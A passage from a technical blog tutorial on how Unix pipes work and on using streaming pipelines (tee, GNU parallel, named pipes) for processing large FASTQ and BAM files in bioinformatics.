<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> genome.fasta </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"&gt;chr1"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><br></span></code></pre></div></div>
<p><strong>Step 1: Shell creates the pipeline</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">User types: cat genome.fasta | grep "&gt;chr1" | wc -l</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">         ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Shell creates:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - Pipe A (between cat and grep)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - Pipe B (between grep and wc)</span><br></span></code></pre></div></div>
<p><strong>Step 2: Processes fork and file descriptors redirect</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Process: cat genome.fasta</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  stdout (fd 1) → Pipe A write end</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Process: grep "&gt;chr1"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  stdin (fd 0)  ← Pipe A read end</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  stdout (fd 1) → Pipe B write end</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Process: wc -l</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  stdin (fd 0)  ← Pipe B read end</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  stdout (fd 1) → Terminal</span><br></span></code></pre></div></div>
<p><strong>Step 3: Execution flows</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Pipe A buffer:     Pipe B buffer:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[data from cat] → [data to grep] → [data to wc] → [count to terminal]</span><br></span></code></pre></div></div>
<p><strong>Step 4: Back pressure synchronization</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">If grep is slow:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - Pipe A fills up</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - cat blocks (can't write)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - System automatically waits for grep to catch up</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">If wc is slow:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - Pipe B fills up</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - grep blocks (can't write)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - System waits for wc to catch up</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-memory-efficiency-why-pipes-dont-load-everything-into-ram">5. Memory Efficiency: Why Pipes Don't Load Everything into RAM<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#5-memory-efficiency-why-pipes-dont-load-everything-into-ram" class="hash-link" aria-label="Direct link to 5. Memory Efficiency: Why Pipes Don't Load Everything into RAM" title="Direct link to 5. Memory Efficiency: Why Pipes Don't Load Everything into RAM" translate="no">​</a></h3>
<p><strong>Without pipes (writing to disk):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">command1: Read all data → Write 100GB to disk</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          Disk (100GB) ← Slow, uses storage</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">command2: Read 100GB from disk → Process → Write results</span><br></span></code></pre></div></div>
<p><strong>With pipes (streaming):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">command1: Read chunk → Write chunk to pipe buffer (64KB)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                      ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                   Pipe buffer (kernel memory, reused)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                      ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">command2: Read chunk → Process → Write chunk to next pipe</span><br></span></code></pre></div></div>
<p>Only a small amount of data (one buffer, ~64KB) sits in memory at any time. The buffer is <strong>reused</strong> as data flows through, so memory usage stays constant regardless of total data size.</p>
<p><strong>This is the magic of pipes:</strong> Constant memory usage, not linear in data size.</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-example-processing-a-large-fastq-file">Practical Example: Processing a Large FASTQ File<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#practical-example-processing-a-large-fastq-file" class="hash-link" aria-label="Direct link to Practical Example: Processing a Large FASTQ File" title="Direct link to Practical Example: Processing a Large FASTQ File" translate="no">​</a></h2>
<p>Let's apply pipes to a real bioinformatics workflow.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="without-pipes-wasteful">Without Pipes (Wasteful)<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#without-pipes-wasteful" class="hash-link" aria-label="Direct link to Without Pipes (Wasteful)" title="Direct link to Without Pipes (Wasteful)" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 1: Filter low-quality reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastqc reads.fastq </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--outdir</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">qc_before/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastq_quality_filter </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> reads.fastq </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> reads_filtered.fastq </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-q</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">20</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># File created: reads_filtered.fastq (70 GB)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 2: Count remaining reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"> reads_filtered.fastq</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Temporary file: 70 GB on disk</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 3: Get sequence length distribution</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'NR%4==2 {print length}'</span><span class="token plain"> reads_filtered.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">uniq</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> length_dist.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Processing reads_filtered.fastq again</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cleanup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> reads_filtered.fastq</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total I/O: Read source (100GB) + Write filtered (70GB) + Read filtered (70GB) = 240GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk: 170 GB (100 source + 70 intermediate)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="with-pipes-efficient">With Pipes (Efficient)<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#with-pipes-efficient" class="hash-link" aria-label="Direct link to With Pipes (Efficient)" title="Direct link to With Pipes (Efficient)" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Single streaming pipeline: Filter → Count → Length distribution</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastq_quality_filter </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> reads.fastq </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-q</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">20</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">80</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> read_count.txt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'NR%4==2 {print length}'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">uniq</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> length_dist.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total I/O: Read source (100GB) = 100GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Total disk: 100 GB (source + final outputs only)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Memory: ~100MB (pipe buffers)</span><br></span></code></pre></div></div>
<p><strong>Comparison:</strong></p>
<table><thead><tr><th>Metric</th><th>Without Pipes</th><th>With Pipes</th></tr></thead><tbody><tr><td><strong>Total I/O</strong></td><td>240 GB</td><td>100 GB</td></tr><tr><td><strong>Disk space</strong></td><td>170 GB</td><td>100 GB</td></tr><tr><td><strong>Processing time</strong></td><td>Slow (multiple reads from disk)</td><td>Fast (one sequential read)</td></tr><tr><td><strong>Memory usage</strong></td><td>Streaming OK</td><td>Streaming OK</td></tr><tr><td><strong>Failure recovery</strong></td><td>Restart entire pipeline</td><td>Pipeline atomicity issues</td></tr></tbody></table>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="advanced-pipe-patterns-in-bioinformatics">Advanced Pipe Patterns in Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#advanced-pipe-patterns-in-bioinformatics" class="hash-link" aria-label="Direct link to Advanced Pipe Patterns in Bioinformatics" title="Direct link to Advanced Pipe Patterns in Bioinformatics" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-parallel-processing-with-gnu-parallel">1. Parallel Processing with GNU Parallel<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#1-parallel-processing-with-gnu-parallel" class="hash-link" aria-label="Direct link to 1. Parallel Processing with GNU Parallel" title="Direct link to 1. Parallel Processing with GNU Parallel" translate="no">​</a></h3>
<p>Process multiple files simultaneously while piping:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Process 1000 FASTQ files in parallel</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">find</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-name</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"*.fastq"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  parallel </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--pipe</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--block</span><span class="token plain"> 10M </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token string" style="color:hsl(119, 34%, 47%)">'fastq_quality_filter -q 20 -p 80 | gzip'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> all_filtered.fastq.gz</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-tee-branching-a-pipeline">2. Tee: Branching a Pipeline<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#2-tee-branching-a-pipeline" class="hash-link" aria-label="Direct link to 2. Tee: Branching a Pipeline" title="Direct link to 2. Tee: Branching a Pipeline" translate="no">​</a></h3>
<p>Use <code>tee</code> to send data to multiple streams:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Simultaneously:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Count reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Filter and output</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Generate statistics</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools view input.bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">samtools flagstat /dev/stdin </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> flagstat.txt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-F</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> sorted_aligned.bam -</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># The &gt;(command) syntax is "process substitution"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># It creates a named pipe to a subprocess</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-named-pipes-mkfifo-for-complex-workflows">3. Named Pipes (mkfifo) for Complex Workflows<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#3-named-pipes-mkfifo-for-complex-workflows" class="hash-link" aria-label="Direct link to 3. Named Pipes (mkfifo) for Complex Workflows" title="Direct link to 3. Named Pipes (mkfifo) for Complex Workflows" translate="no">​</a></h3>
<p>For workflows requiring multiple inputs/outputs:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create named pipes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">mkfifo</span><span class="token plain"> pipe1 pipe2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Process A writes to pipe1, reads from pipe2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> input.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> pipe1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Process B reads from pipe1, writes to pipe2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> pipe1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> pipe2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Main process reads final result</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">uniq</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> pipe2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cleanup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> pipe1 pipe2</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-buffering-and-backpressure-management">4. Buffering and Backpressure Management<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#4-buffering-and-backpressure-management" class="hash-link" aria-label="Direct link to 4. Buffering and Backpressure Management" title="Direct link to 4. Buffering and Backpressure Management" translate="no">​</a></h3>
<p>Sometimes a slow downstream command creates a bottleneck. Use <code>buffer</code> to add extra memory:</p>
